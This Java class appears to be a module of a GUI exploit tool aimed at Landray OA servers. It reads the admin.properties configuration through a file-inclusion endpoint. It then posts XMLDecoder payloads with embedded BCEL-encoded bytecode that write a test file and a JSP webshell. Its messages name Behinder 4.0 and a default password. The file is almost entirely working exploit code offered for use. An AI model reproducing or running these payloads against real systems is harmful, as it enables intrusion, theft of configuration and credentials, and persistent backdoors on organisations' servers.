package exp.oa.landrayoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.Methods;

import java.util.HashMap;

public class landray_sysSearchMain_rce implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return shell(url, textArea);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea) {
        HashMap<String, String> head = new HashMap<String, String>();
        head.put("Content-Type", "application/x-www-form-urlencoded");
        String poststr = "var={\"body\":{\"file\":\"/WEB-INF/KmssConfig/admin.properties\"}}";
        Response post = HttpTools.post(url + "/sys/ui/extend/varkind/custom.jsp", poststr, head, "utf-8");
        if (post.getCode() == 200 && post.getText().contains("kmss.properties")) {
            Platform.runLater(() -> {
                textArea.appendText("\n [ landray_sysSearchMain_rce ]");
                textArea.appendText(post.getText().replace("\n", "").replace("kmss.properties.encrypt.enabled = true", ""));
            });
            return true;
        } else {
            Platform.runLater(() -> {
                textArea.appendText("\n ");
            });
            return false;
        }
    }

    private Boolean shell(String url, TextArea textArea) {
        HashMap<String, String> head = new HashMap<>();
        head.put("Content-Type", "application/x-www-form-urlencoded");
        String poststr = "var={\"body\":{\"file\":\"/sys/search/sys_search_main/sysSearchMain.do?method=editParam\"}}&fdParemNames=11&fdParameters=<java><void+class%3d\"com.sun.org.apache.bcel.internal.util.ClassLoader\"><void+method%3d\"loadClass\"><string>$$BCEL$$$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$adW$5b$93$d3$d8$Rn13x0$s$c0$c0$A$b3l$d8$ec$s$9b$jX$60d$7b$bc$60$60$n$p$8f$r$cb7$c6$96$z$c9$o$c9F$b7$b1d$eb$86$r$7b$c6N$k$f2o$f2$bc$_$s$V$aa$f2$D$f2$87$f2$96J$l$d9$9e$h$de$a4$w$VWY$d2$e9$d3$a7$cf$d7_w$l$b5$fe$f1$af$bf$fd$j$Av$e1OI$f8$C$5e$s$e0U$S$$$c1$cb$q$7c$P$af$c9$e5$cd$3a$fc$s$J$7b$c0$q$a1$A$fbI$u$C$9b$E$OJI$e0$a1$9c$80J$C$aaI$b8$G$_$d7$a1$96$84$7bP$t$83$b7$ebp$40$ee$8d$q$a4$a0$b9$OB$CZI$b8C$ac$b7$c9$5d$5c$H$89$u$cbd$beC$$J$C$de$r$e0$b7$U$5c$7ee$7bv$f4$9a$82$95$ed$87$o$F$ab$F$df0$v$b8$5e$b5$3d$b3$3et5s$d0R5$H$r$hU_W$jQ$j$d8d$3c$X$aeF$96$jRp$bf$g$a8c$c7W$8dp$87U$c3$a8$i$fa$5eQ$b7$7c$a6P$ac$be$a4$mY$3c$d6$cd$m$b2$7d$PUW$5d$d5$f6$u$b8$b3$fd$ae$daSG$ea$8e$a3z$dd$j$n$g$d8$5e$f7e$bc$bf$3a$e8$a2$da$ad$r$d3$U$ac$bf$d2$9d$FZ$ddA$b5$9bg$b4$K$8e$g$86$a8$b4$g$a8$91E$f0$$1$90$K$f0$n$92$Gvd$O2$Ul$cetl$7f$e7$e0T$8ejk$a1e$3a$O$F$J$c3$d4$91$8e$B$F$f7$aa$e1$d0$dbq$edP$dfa$f6$84$e2w$bb$fb$b3$Zbs$a64$db$83$82kB$a4$ea$fd$9a$g$c4$U$n$cbH$80$e0$P$H$ba$c9$da$84$b2$cd$8b$M$3d$r$YR$f0$L$f8$92$82$ad$9f$e41$B$bfK$c1$ef$e1$87$U$fc$BT$8c$8f$WZOy$P$e1$G$D$T$af$J$d0R$a0$83$91$A3$F$87$d0M$80$95$C$hz$J$e8$a7$c0$B7$B$5e$K$7c$I$90$d9$r$$Sp$f7$oY$cc$d0vb$cf$TR$91y$c2$d7$d9$U$bc$87A$KB$88$u$b8$da$dc$ed$b6$cc0z$da$L$83$U$M$n$m$f0GT$e2$cf$H$FqO$e7XO$R$98$40$93$99$91$ee5$f2$bc$hX$86$5b$i$gr3$d0$K$bb$ef$ab$dcl$acJ$cf$87$V$fb$f8$7dGV$y$b3$90$eb$e9$9esdp$cbez$96q$3a$e3$dd$f7$bc$bd$e7$i$f4$8e$i$5e$60$8et$d7$c9t$e4$a6$c3s$e5$9c$c1$89$9a$y0EE$aa$8fM$99$a1$x$a7$b2$3e$eaX$V$81$a1$d5Ryddk$dd$a6l$f5$U$d4Q$a5$fc$90$_$85$ddv$b69V$a5$9c$c7s$nbm$d3u$a9$3d$a9$f5$iW$91$f8$b4$b2$df$l$d7$r$de$7e$3bf$3e$c1$d4$c88G$w$t$8ey$ae$96W$5d$W$b1t$87$9dl9$a7$97$9a$a3j$bf$k$e8$9c$e5$e8v$ceS$e4fY$f3$eatG$ca$f5$U$a1k7$dab$abJ$8b$fb$N$3b$df$Q$e8z$ab$$2$96$c2$n7$aenWZQ$af$ea$3aCUn$f85$fbx$a8$c8z$f7$T$db$5e$fdH$91j$c3vF$ec$e9$aeH$L$Z1$d7$8e$f9$b1$GU$d7p$8cb$ec$fb$a4R$e8$87$7c$9fe$dbc$3e$a8$b4$c2n$c7shE$8c$M$9ek$3a$9dL$be$afH$e5$J$fa$b5$afq$ecD$l3vG$ae$3b$8d$cc$f1$84$df$P$bbF$a9$9c3$cf$c8$O$da$f5$Q$9f$tUW$Z$e9$fd$9c$a5Im$ff$7c$5cs$F$a2$5b$ef5l$b2W$xS$7e$8f$b1$a0$f9$e2$7c$_$99$cfw$5cv$a2$a0$j$7d$isR$c7$bf$afe$gh$87$60$3e$d1$b3$ab$FfhH$c7aE$c8$F$9a$a7$8c$d4L$db$3f$5d$7b$d4$d5$3c1$d4$K$fdgg$fd8$Q$y$db$c4$5c$90$d2tpf$cf$a1$92$Ri$c4o$e9$d9$9a$8f$f6$$$ec$3b$d7$T$f8$90$e7r$8e$b1$e0$o$j$Zff$91$3f$b9$5e$y$cb$d2$B$89$8b$e1$e6$H$8a$60$91$3c$h$v$Y$7b$82$95$c4h$e1$af$94N$3fS8$96$ee$c8t$80$dc$e6y$aen$Z$5c$dd$e7$LV$3b$ce$bf$Mkk$5c$bb$ab$I$fd$$$f2$db2$e5$3a$adH$f4P$cb$8at$d5cH$k$d2$g$b7$eb$f3$bd$G$5d$df$c7$7f$81$tv$ce$c4$86$ee$ce$fd$Z$wn$7e$dcr$d9$88$e4$94$9e$V$87U7$j$e8$99$da$b0$d1g$5b$cdV$87nrbO$cb41$Hc$h$H$j7p$3a$d9F$f7D$deK$9f$d8$ad$ba$e8$3f$ed$60$9d5$z$cd$ad$3b$95$ff$t$bf$edrZq$V$82$p$d4$5c1$cb$Xg$b9D$b8Z$d4$5e$d5$9d$c9$O$85$3e$9e$L$b9$8c$96$89$9c$ca$e9$3e$8b$f8$cc$7dhj$b2$i$c5$bc$_$d6W$b8$s$f2$5c$Mp$fd3$beDwI$5d$Yry$88$b59T$b8$3c$87$3a$96V$b0$fa$f3$b8$d9$fax$a6Wn$ed$3e$_$Llo$5e$D$o$cf$89$bb$Y$f7$a1R$aa$cdy$ae$d7$b4$M$8b$Y$ca$cfD$c1$9a$e5$H$7d$3c$eaH$84W$a6W$91$a3$89$n3$f8l$f5$b0v$f3zI$c4$f8$3a$bd$85$8f$3c$a7$fbq$dd$J$8c$sK$7c$60f$cb$8eQ$S$c7$9a$cd$cc$d7$e5$Q$93$82$b5$_$ce$eb$d0$b2$ab$fb$7ba$c7$ce$85$K$faep$dd$e0m6$9d$8fqJ$8e$8by4Vd6$ad$60$de$ccj$3d$ed$Y$9c5R$K$5d$ccO$f1$d8$90X$ac$91$ae$dd$$$e6$5b$o$e6NE$O$bb$N$b2$7f$9b$j$eb$$$9bka$9e$nF$9a$f0$a6Hl$84g$e7H$l$ef$e5$e7$fc$WH$8c$hry$dc$91$9d$D$ac$eb$p$fc$b7$f0$yp$3a$S$ed$9f$3fC0$a6$f6$c9$baYnL$da$c75$87$c6$bc$c1$3a$v0$L$fcy$3d$c6$rN$8c$c2$e2$yd$d2$G$5b$a7Qni$C$e2$f6$88$fd$G$f2$q$bad$P$pc$F$a4F$w$dc$b1$a3$b9$G$ad$ee$ef$k$e1$f9$fd$8c$bfp$a6$l$I$M$a3$7be$cb$94kC$cc$93$p$b3$9dw$db$$$8b9$d9$8em$R$k5$S$cbls$86$dd$cdO$aa$9e1V$R$eb$o_$b0$$$feg$9c$87$c2$ac$f61$_h$95s$s$b3x$cc$e2$8e$f5s$a66$W9$c4c$8d$a0$7cl$9d$7dO$n$ffX$f3t$ec$db$cc$l$dc$8b$e8$91Z$R$a4$dc$c4$e0X$f4$afM$ea$cb$d1e$c4R$aa$f9$f1$3b$b6$5d$li$5e$d31K$N$cc$918$97$bf$c7$c6jy$9fB$c1$8d$8bo$f8$U$i$c11$f6$3a$ed$W$fb$e49y$81$8fS0$81Q$K$feH$3a$91$5b$a7$ea$t$ed$db9$po$b5$9e$a9G$e7D$zk$60$aa$G$b6$40$fap00$bdh1$be$bd$fd$b0zQ$L$h$a7$cd$ae$Z$V$7c$eca$8e$a3$b8w$abb$e3C$90n$9dS$3f3E$d6$y$9d$a0$e0$K$e9$9ab$J$F_o$_i$z$974$8a$d7$_$88$d0iDt0$f0$pt$M$dd$dd$f7g$bd$eaW$L$3c$a1$89$8e$d9$d1x$e7$a2$O$g$7b$f0$9f5$90$94$d8$5b$ec$T$e3$5e$90$82$cf$3f$b1z$3a$8b$f6$ee$fd$d4$iv_h$894$e3$f3$90$y$ecxf$b4$d3n$92$86$3buv$8c$j$i$f1$w$ee$89$cf$H$e2$a4$x$5e$L$D$c7$c6P$7e$b3$8c$b8$a5$8d$f8e5$IL$PC$fb$e4$bfp$7d$ae$99$q$j$7c$e4$_$g$e5$cdeK$c5$93$7e$9a$Z$k$k$92$c8$deY$K$8a$c1$96u$fb$j$b3$dcB$o$ee$f2$j$qgMw$fc$d0$84$_$f1$D$eb$L$m$bf$V$a0H$a7$8d$e3$afp$94$c5$R$85$f7$b5G$l$80$fa$R$l$$$c1$_$f1J$be$c7$A$S$b0$K$eb$f0$x$7cJ$cd$94$e0k$f85$de$bf$c1$ff$wJ$k$c0$V$d8$86$87sS$cf$f0N$b4$ae$7c$84K$9d$P$b0$o$5d4w$V$8d$a5$ce$98$bb$C$8f$e0$dbs$e6$d6$e11$o$a3$889j$F$b7$bb$8c3$d6_au$Kk$h$97$a7$90$a8$3c$9a$c2$fa$U$aeL$n9$85$ab$d5$8f$90$ea$7c$84k$b8$d9$cf$be$dd$b8$3e$85$h$x$99$v$dc$dc$d8$c0$cb$Un$7d$80$db$b5$8d$cd$faG$b8$83$Kw_$ac$7e$84$7b$9d$ad$d5$tS$d8$da$f8$ec$D$dc$7f$b1$f6xkm$K$9f$3f$9e$c2$cf$ff$C$ab$95$lcL$3a$7e$3a$3c$40$8e$I$ea$a7$88$Y$e0$G$a2$bd$J$9f$c1$G$bc$82$5b$f0$GnC$J6$a1$83$9f$94$3f$c0$5d$d4$df$c2$V$f7$a0$L$f7c$cf$5e$p$e6$UH$f0$EW$D$ae$e2a$Hh$b4$fc$K$bdLC$Gyx$83zY$94$ad$a0$9d$fb$f8$N$9cC$df$3b$c8$d0w$u$5bC$S$J$_$97$fe$J$87$Jx$8e$y$40$3e$s$f1$c5$bf$B9$8d$bc$9d3$P$A$A</string><void+method%3d\"newInstance\"></void></void></void></java>";

        String txt = "var={\"body\":{\"file\":\"/sys/search/sys_search_main/sysSearchMain.do?method=editParam\"}}&fdParemNames=11&fdParameters=<java><void+class%3d\"com.sun.org.apache.bcel.internal.util.ClassLoader\"><void+method%3d\"loadClass\"><string>$$BCEL$$$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85U$dbV$dbF$U$dd$83md$84$u$60$aeN$I4i$d3$Y$C$b8$r4$a5$5c$8b$c1$Q$82$n$U$hS$97$b6$a9$y$L$5bDH$ae4$a6$90$f6$7f$fa$9c$X$91U$d6$ea$H$f4$87$fa$96$95327$bbj$ea$b5$3c$a39g$cf$9es$f6$99$cb$df$ef$fe$fc$L$c04$7e$971$829$J$f32Z0$tc$B$8b$a2Y$8a$e2$h$Z$cbH$c9X$c1$aa$8c4$d6d$ac$e3$99$8c$N$3c$97$b0$v$n$p$a3$DsQl$c9$Y$c4$b6$Y$bc$88bG$f4$df$caP$b0$hEVBNF$bf$60$df$T$7d$3e$8a$7d$B$feN$f8$L$a2$f9$5e$c2$81$84$l$YZ$e7$N$cb$e0$8b$M$a1$c4h$9e$n$bcb$97t$86$ce$8ca$e9$db$b5$e3$a2$ee$e4$d4$a2I$96X$c6$d6T3$af$3a$86$Y_$g$c3$bcb$b8$M$p$99$aazf$daj$c9M$ae$a9$$$7f$ee$daVZ$ab$d89$dd$e5$a9$f4Jf$8eAN$9fjz$95$h$b6E$f0$f0$b1jX$M$fd$89$83$cc$91z$a2$sM$d5$w$t$b3$dc1$ac$f2$9c$l$83$ea$94$J$d6$T$e0f$88$cek$e6U$c4$9aI$b0$ee$5b$a8$VSu$5d$C$85$ab$w$af$88$98$D$I$94$w$7d$f0$7d$c7$e0$ba3$c5$d0W$c7$Yvr$e7$c6N$b0$88$5b$d1M$93A$w$e9$gI$e20$Mf$dc$9a$95$3c6$5c$z$99Z$ce$a6$9fN$af$d6$3d$82$b3$O$aa$af$c1$d0$91$e5$aa$f6jK$ad$fa2$91$d2$q$40$d6$ae9$9a$bef$I$d9$e2A$wM$8a8$U$7c$8c$fb$M$f7$3e$a8$a7$84$l$V$fc$84$97$K$7e$86J$b5$w$ba$95$c9$N$8b$c2$ae$3a$3a$b5$S$8a$K4$94$q$e8$K$OQ$96PQ$60$e0H$c2$x$F$s$8e$rX$KlTI$e1$80$d4$Z$G$9aEK$d5$M$d3W$40$daO$a7$s6$b6$d7$U$fc$CG$81$LN$ab$efN$97E$60$5cws$93$fc$94$x$a8$a1$w$d28a$e8$cd$ae$e7$dd$e2$faLy$efh$d7$ca$af$e7_$97$96$X$W$a8$f0$c1$3a2t5$af$ac$e0W$9cR$z$f6rk$T3$82$f4L$c1k$9c$u$f8M$a8$d4s$D$bf$de$5e$N$q$_$8aG$ba$c6$hL$b9$8a$a3$ab$r$w$91Vs$i$dd$e2W$e3$de$c4h$a6$ZE$85$ed$x$eb$7c$c5$smO$b9$bf$b72T$U$Ri$bc$B$7e$cb$r$e6$E$3a$Y$daDE$7d$L$c3$c3D$c0$d6$P$d8$c8$9dM$sJ$9a$o$daqlN$89Q$ba$abv$fd$y$3d$b8$8a$c7$d5$v1$83$9f$r$9b1D6$fca$E$89$e2gK$fb$d8$df$ab$MC$ffb$bd$f1$S$df$e0$7f$f9$Y$da$89I$5c$Y$97$r$b9$e2$b1t$9e$dc$db$V$X$82r$7bL$3bKd$e5$9f$d9$c6B$5c$9f$da$88$5b5$N$w$e5$a3$m$e1$C$_$8aV$b5Z$d5$z$w$ed$c4$ffh$dd$b0$c9$c5$N$c3$ed$ab$83$dc$X45$7f$7d$deS$b5$c3CQ$d9$fe$c0$a0Rt$94$S$H$a9$60$G$c9$bf$85L$S$t$a2$99$b6$ab$e3$3e$3d$C$p$Q$bf$Q$98$b8$Fh$fc$80FOh$c4$a8$8f$8c$9d$83$bd$a1$8f$W$7cB$adx3$A$JaD$f1$v$7d$vu$Q$k$e23$ea$l$d1$3fL$96a$b4$n$81$d1K$aa$af$a8$X$a8$b6$L$b4$U$ce$R$dao$a6k$t2$e5$W$5d$h$c6$f0$b8$81$$$8aq$8a$8c$J$3a$W$a2$e5Z$c9Sy$8b$b0$87H$ac$d5$83$b49$e6$n$ea$a1$cd$83$ec$a1$3ds$B$a5p$81$OZ$ec$a3$c7$b1N$P$5d$a1$v$P$dd$b1$Y5$kz$ce$d1$bb$V$eb$db$be$40$3f$B$Gf$c3$X$Y$y$c4$c3$T$k$e2$b1$3b$e7$b8$3b$h$Z$8fG$3c$M$8d$7b$b8$f7$H$c2$9bo$fc$984$ba$d2$86I$p$R$f5$qE$MtQ$b4$dd$b8$83$Y$e6$d1$8b$r$f4$e1$Z$3dy$F$M$e0$r$3dy$gy$O$RG$ZC$7ef$8b$U$b3$82$7dL$d0l$90o$DI$7cN$cc$f3$94$e5$X$98$o$j$96$I$f7$84l$n$e2$b9K$ef$f4$97$94$7b$81$UzJ$b6$I$89$uti$f9$H$87$SfH$F$7c$ed$8b8$fb$kT$98$f9$d5$d7$H$A$A</string><void+method%3d\"newInstance\"></void></void></void></java>";

        HttpTools.post(url + "/sys/ui/extend/varkind/custom.jsp", txt, head, "utf-8");
        Response response = HttpTools.get(url + "/R4gTesttesT.txt", new HashMap<String, String>(), "utf-8");
        if (response.getCode() == 200 && response.getText().contains(Methods.test_payload)) {
            Platform.runLater(() -> {
                textArea.appendText("\n 文件写入成功 \n " + url + "/R4gTesttesT.txt");
//                textArea.appendText("\n 开始尝试写入shell");
            });
            HttpTools.post(url + "/sys/ui/extend/varkind/custom.jsp", poststr, head, "utf-8");
            Response response_2 = HttpTools.get(url + "/R4gTest.jsp", new HashMap<String, String>(), "utf-8");
            if (response_2.getCode() == 200 && response_2.getText().contains("yes")) {
                Platform.runLater(() -> {
                    textArea.appendText("\n getshell 成功 \n" + url + "/R4gTest.jsp");
                    textArea.appendText("\n 默认冰蝎4.0 rebeyond");
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n 写入失败");
                });
                return true;
            }
        } else {
            Platform.runLater(() -> {
                textArea.appendText("\n 写入失败");
            });
            return false;
        }
    }

}
